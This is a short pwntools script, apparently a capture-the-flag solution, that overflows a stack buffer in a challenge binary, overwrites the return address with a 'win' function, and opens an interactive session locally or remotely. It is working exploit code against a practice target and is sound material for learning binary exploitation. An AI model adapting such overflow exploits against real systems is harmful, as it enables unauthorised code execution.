#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bin-chall-00")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pad = 0x20 + 0x8
win = elf.symbols["win"]

payload = b"A" * pad
payload += p64(win)

pause()
io.sendafter(b"Input: ", payload)

io.interactive()
